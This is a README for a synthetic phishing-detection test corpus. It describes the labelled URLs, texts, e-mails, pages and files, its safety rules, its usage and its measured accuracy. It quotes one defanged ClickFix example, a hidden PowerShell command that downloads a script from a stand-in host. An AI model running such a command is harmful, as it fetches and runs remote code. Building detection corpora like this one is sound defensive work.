# UniPhish sample corpus

A small, labelled, **synthetic and inert** set of phishing and benign artifacts for demos,
tests and the README gallery. It is a teaching and smoke-test corpus, not a benchmark of
field performance (see `docs/evaluation.md` for that, and for why).

| Vector | Where | Items |
| --- | --- | --- |
| URLs (Latin, Cyrillic, Greek, Arabic, CJK, Devanagari, Hangul; squats, IDN, structure) | `urls.jsonl` | 54 |
| Text: SMS/chat smishing, BEC, prompt injection, benign; 12 languages | `texts.jsonl` | 40 |
| E-mail (`.eml`) | `emails/` | 9 |
| HTML pages | `pages/` | 6 |
| Files (double extension, RTLO name, SVG with script, QR PNG, HTML smuggling stub, benign) | `files/` | 8 |

`manifest.yaml` indexes every item with its **label**, category, language/script, the
**headline signal** the engine should emit, and a `hard` flag. The `emails/`, `pages/` and
`files/` folders each have a README mapping file to label.

## Labels

* `malicious` - phishing, BEC, callback scam, quishing, prompt injection (anything the
  engine should not call benign).
* `benign` - legitimate content, including adversarial look-alikes such as a brand's own login
  page, a brand name in an unrelated path, legitimate IDNs and genuine OTP messages.
* `hard: true` - deliberately difficult for an **offline** engine (a typo-squat with no other
  lure, a wrong-number opener, a CJK brand IDN, a reserved domain with a `/login` path ...).
  They stay in the corpus so it does not flatter the detector; aggregate numbers must say
  whether they include them.

## Safety: everything is inert

* Hosts are reserved (`.test`, `.example`, `.invalid`, `example.com`) or obviously fictional.
  The only real names are platforms a technique cannot be shown without: an open redirector
  (`google.com`), a free host (`pages.dev`), an IPFS gateway, a URL shortener and a freemail
  provider (`gmail.com`, used for the BEC Reply-To). Only invented labels, paths and local
  parts appear on them, and no request is ever made.
* Phone numbers are fictional (555-01xx). IBANs are placeholders.
* No malware, macro, exploit or working payload. The ClickFix clipboard string is the inert
  `powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"`; the "smuggled" blob is plain text;
  the "executable" with a double extension is a text file; `files/*.sample` are stored under
  safe names and presented to the engine under the dangerous name (`manifest.yaml: filename`).
* A test (`tests/eval/test_corpus.py`) enforces the reserved-host rule and the absence of
  executable/archive magic bytes.

## Use it

```python
from uniphish.eval.corpus import load_items, load_corpus, counts

for item in load_items(kinds=["email"], labels="malicious"):
    verdict = engine.analyze_sync(item.to_artifact())

for kind, payload, label, meta in load_corpus():      # (kind, payload, label, meta)
    ...

counts()                                              # totals per kind / label / category
```

`CorpusItem.to_spec()` / `.to_eval_item()` give the eval harness's `ArtifactSpec` / `EvalItem`
(url, text, email and page only). `python -m uniphish.eval.corpus` prints the counts and
validates the corpus. Set `UNIPHISH_CORPUS_DIR` to point at a copy.

## Measured behaviour (offline engine, this repository)

Direction only (malicious -> not benign, benign -> benign), `online=False`:

* non-hard items: 86 of 86 agree;
* hard items: 17 of 31 agree;
* overall: 103 of 117 (88.0%).

Re-measure with `.venv/bin/python -m pytest tests/eval/test_corpus.py -q -s`. These numbers
describe a hand-curated demo set that the detector's authors wrote; they are not an estimate
of real-world accuracy.

## Regenerate

The content lives in `_build/data_*.py`; the files here are generated:

```bash
.venv/bin/python examples/corpus/_build/build.py          # rewrite
.venv/bin/python examples/corpus/_build/build.py --check  # exit 1 if stale
```

Output is deterministic (no timestamps or randomness). The QR PNGs come from OpenCV's
encoder; bytes may differ between OpenCV versions, so the test checks they *decode* to the
documented URLs rather than byte-comparing them.

To add an item: add a row to the relevant `data_*.py`, rebuild, run the test, and if the
engine does not agree with your label either fix the label or mark the item `hard=True`
with a note explaining why it is difficult.
